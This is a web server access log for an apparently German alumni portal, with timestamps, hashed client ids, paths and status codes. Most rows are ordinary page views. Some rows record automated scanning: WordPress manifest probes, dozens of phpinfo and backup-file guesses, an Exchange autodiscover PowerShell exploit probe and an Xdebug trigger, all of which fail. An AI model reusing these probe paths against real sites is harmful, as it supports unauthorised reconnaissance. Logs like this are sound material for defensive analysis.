c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:29;;/aktuelles/stellenangebote;GET;200
3dc2a43ecf2dfc86c1cdf2811e836c2033832f5cfda08bdff57c1bb44eefcdc8;2025-11-17 23:46:41;;/;GET;200
6bf2faf0dd32fb6e3fcd8d18f10e8034591240600b1c99bd37477be1ecd95d0b;2025-11-17 23:47:14;;/personen/alumni/schule/40745;GET;200
ef72a619f7d72b94e65d7ef8f50211ffc419bfb5bfb60f5d5b5e80f8d4070f8e;2025-11-17 23:48:56;;/;GET;200
ce036983705820e8d373c67c2dcf65b804610840fb4912644ba2306f11ac3a3a;2025-11-18 00:03:24;;/personen;GET;200
f35d76c4cd4aad70a669eeba36b521159a65a36cffa9e125b8e168f15eb5e314;2025-11-18 00:17:34;;/themen/details/david-gegen-goliath;GET;200
b3a04d2cdb31b5fdcc1ced32ea0f3e1232acd42d7578bb03b22d26569da0b30d;2025-11-18 00:27:38;;/personen/alumni/details/heidi-burghard;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-18 00:36:14;;/;GET;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-18 00:37:09;;/personen/alumni/schule/10A04;GET;200
188f8ae6fccf990f2a8b777e29c1590a715817164f821edf6b188ec0a6b2e881;2025-11-18 00:43:25;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:25;;/;GET;200
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//xmlrpc.php?rsd;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;/;GET;200
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//blog/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//web/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//website/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//wp/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//news/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//2018/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//2019/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//shop/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//wp1/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//test/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//media/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//wp2/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//site/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//cms/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//sito/wp-includes/wlwmanifest.xml;GET;404
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:50:54;;/;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:19;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:22;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:23;;/personen;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:24;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:27;;/themen/details/der-start-ins-studium;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:28;;/aktuelles/stellenangebote;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:29;;/themen/details/abschied-aus-moabit;GET;200
9b06b22df948a0ac6e7b476490cfbd5c04e2a6c305b4c88605095120aa8fba2d;2025-11-18 00:52:16;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
ab4c4a7d2d44cef82ce059e16fe7461fb2d46ce24e330fd08023660d94d29d62;2025-11-18 00:55:26;;/reset-password;GET;200
58b24007c60dab5c5419e584adccdb7cd5356c203b6e22eb7bc41ee26a42b701;2025-11-18 00:56:12;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:03:48;;/;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:03:53;;/assets/app/form.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:05;;/assets/app/core.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:07;;/assets/@symfony/stimulus-bundle/controllers.js;GET;404
f60a1195a54ff55ac800c733611cd187edd86510c8d04f35cb1c26c959bcd42e;2025-11-18 01:04:11;;/personen/alumni/schule/4240016;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:13;;/assets/@symfony/ux-turbo/turbo_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:15;;/assets/controllers/hello_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:20;;/assets/controllers/form-collection_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:05:24;;/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:05:37;;/_profiler/phpinfo;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/php_info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/info2.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/test.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/phpinfo;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/php_version.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/info1.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/pi.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/php.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/serverinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/phpversion.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/i.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/server.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:15;;/debug.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/diagnostic.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/check.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/phptest.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/php_info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:55;;/info.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:55;;/php_info.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/php_info.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/phpinfo.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/test.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/info.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/info.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/test.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/phpinfo.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/phpinfo.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/test.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/phpinfo.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/phpinfo.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/info.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/info.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/test.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/php_info.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/php_info.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/test.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/php_info.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:15;;/test.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/php_info.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/phpinfo.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/phpinfo.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/info.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/test.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/php_info.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/test.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/admin/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:18;;/info.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:22;;/admin/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:36;;/admin/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:04;;/admin/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/test/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/test/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/dev/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/test/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/test/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:58;;/public/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/web/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/web/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:10;;/web/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:11;;/web/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:19;;/www/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:21;;/www/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:30;;/www/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:40;;/www/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:49;;/site/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:49;;/site/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:50;;/site/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:50;;/site/phpinfo.php;GET;404
cd64b48e213c364ba8bbf1f9ea620f18cb8d8579c28601fd382fb1796b77b3dc;2025-11-18 01:11:44;;/;GET;200
0cd0a52058a589045bebda2bc6529b67360def77934e407e63a3c01911dd79a3;2025-11-18 01:12:59;;/personen/alumni/details/felix-fischer;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-18 01:19:36;;/gruppen/hobby/fremdsprachen;GET;302
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-18 01:19:40;/gruppen/hobby/fremdsprachen;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:22:30;/gruppen/hobby/finanzbildung;/gruppen/hobby/tanzen;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:22:31;/gruppen/hobby/finanzbildung;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:23:52;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;/aktuelles/meldungen?category=wissenschaft;GET;200
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-18 01:25:06;;/gruppen/hobby/reisen;GET;302
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-18 01:25:10;/gruppen/hobby/reisen;/gruppen;GET;200
29c25bc9806d79a607bbd7add12c3b449b1f195103bda1c926890014535a6bb2;2025-11-18 01:26:24;;/;GET;200
234170fa8f73d794f81a8efb6a05a89c4ce556990e9b1193a3f58cdc9f180c73;2025-11-18 01:28:50;;/personen/alumni/details/tobi-esche;GET;200
c986e9617808ff09c542a0bbc0902212f4f95f3e2e0ddba3e277115392191450;2025-11-18 01:32:33;;/login;GET;200
e2b2a3408eaa5c1900f66dd3bd0e1507bce3092e458652fda3fba68a922b2bd3;2025-11-18 01:33:12;;/;GET;200
6240a1d075446a9bace05a3000772ef6d97686d240255bf6fc49384fe1c73ea4;2025-11-18 01:39:07;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
d921670028f75b804eb8468c33e358f2434ff31b810ba23e617040fbb0666a27;2025-11-18 01:41:15;;/;GET;200
6730100ea26a3174d51030bda7bb4de2863f6e5e305d3dd46d681d3c397fde85;2025-11-18 01:48:59;;/;GET;200
702a5732dbbfd6c9e387a03d7afd1b9acaf0fd9051aadfca66bbe58bfdf30dd2;2025-11-18 01:49:03;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
eeada3c73d1a77a3b3ca872e5cdb5d902d605a6a295c24ca5e48fc467ae1041c;2025-11-18 01:55:45;;/;GET;200
5485fba24766240df5f46753393cc5f05f59da21a738727bb12c6d0543e84ba0;2025-11-18 01:58:07;;/rechtliches/nutzungsbedingungen;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-18 02:02:55;;/?XDEBUG_SESSION_START=phpstorm;GET;200
190cd7855b395928d1e15e76d5a50f6ea332fdf3d031fb0f4e4d2b6b9532fece;2025-11-18 02:08:11;;/themen?category=kultur;GET;200
77d5e4487d2dbfaee501102df13b6e9213b69eac326337d4028fc4f53917cf8a;2025-11-18 02:09:27;;/rechtliches/impressum;GET;200
f9d6fd0eca98c1190ede142162501012a3b195bc4d1a7f52c0afb049a1f90dc8;2025-11-18 02:09:37;;/gruppen/hobby/film-und-videoproduktion;GET;302
f9d6fd0eca98c1190ede142162501012a3b195bc4d1a7f52c0afb049a1f90dc8;2025-11-18 02:09:42;/gruppen/hobby/film-und-videoproduktion;/gruppen;GET;200
b8b371a672032d9dc93cea57e1d24867be43880e47610747e200141eb438f1d4;2025-11-18 02:25:59;;/;GET;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-18 02:30:02;;/personen/alumni/schule/HS001;GET;200
f986f0faa45750b85ba686905f0e5053922871f996c68fcfd659e46a67f235a3;2025-11-18 02:40:15;;/owa/auth/x.js;GET;404
485c625f5480bb0b45de6498f5428e9ae6593a4c5f446415d29206f0c2e319ab;2025-11-18 02:45:13;;/gruppen/interesse/it-und-softwareentwicklung;GET;200
e038e37da1d2173d7ac53527f6315394432f15ab37c20c23f4c2f873ba4e3fc2;2025-11-18 02:52:54;;/;GET;200
404b8ae57482a42363d372ede91ae2ba05dc1bc78e67e3003d0ccd4ad328ddf0;2025-11-18 03:04:51;;/;GET;200
0c25dbeec6be6e394e97ca433e108bf64b4a6a304d7e6ec2245f214d63b03626;2025-11-18 03:06:07;;/;GET;200
9af1d67a1bc30b4da3a38df65dad90c1ae815204eed3719efe46afaaf74dbe61;2025-11-18 03:08:16;;/;GET;200
094939c7719a27c29c2962f0d1e3c4bfc8f018ef1720f8b630feb5b2ad7dd40b;2025-11-18 03:14:13;;/;GET;200
6a21ae34f2f4e5974c84a2453397b00c18d74492a3f1139a0290206420fc2e0d;2025-11-18 03:18:37;;/personen/alumni/schule/190627;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:23;;/;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:48;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:50;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:50;;/personen;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:52;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:55;;/themen/details/der-start-ins-studium;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:57;;/aktuelles/stellenangebote;GET;200
580f9a874f64d90f66a6056940be4a1a33d3f86e96c060e56e18949733136a2c;2025-11-18 03:28:58;;/themen/details/abschied-aus-moabit;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-18 03:30:18;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/185826;GET;200
46a256bad355735bd0a910a71608a4983b212bf73fbf8fc182ea56d4a7706463;2025-11-18 03:31:08;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-18 03:31:41;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/07A05;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-18 03:33:06;/gruppen/hobby/finanzbildung;/gruppen/hobby/literaturanalyse;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-18 03:33:07;/gruppen/hobby/finanzbildung;/gruppen;GET;200
81620640653ed5154127ed9e6d863dec0c8668c74ea2051e59f0d45c06ebcd44;2025-11-18 03:37:44;;/;GET;200
b59dc1479c01cfab70d976e5c09b1e3144f9fb8ee45614bde92fa15a86ed6788;2025-11-18 03:39:45;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-18 03:45:14;;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-18 03:45:14;;/;GET;200
56a49fa60f9d0e9a4887ded69d6a327a243737c9c6e17f8816a653b999a98fed;2025-11-18 03:48:39;;/;GET;200
82328f5d32ab047a6a42de6c81bb8adcb8324dd1b10de5ee991b3b0a1593870f;2025-11-18 03:49:51;;/themen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
f084a6a9c9a2c6e6884da83a15f79eedd6350f677885f0e3de189572559e94e3;2025-11-18 03:50:46;;/;GET;200
7039887801940dd7c62e1d389db1459d29ca09588204a996bc948e7a404eaf5f;2025-11-18 03:53:18;;/;GET;200
be001a9339c00e095c1df1dc87a55736905efb4beb1629a684cef5ec04c26a54;2025-11-18 03:54:46;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
6eb58177c1d8b4677e5af38137920d8617a2da7fd20355662a0ecbdbedaca73e;2025-11-18 03:55:19;/;/;GET;200
4833ceb7610e74fa72e89b5661a2fff017d5d50ebf72f1998f81fb923fd1604a;2025-11-18 04:06:32;;/;GET;200
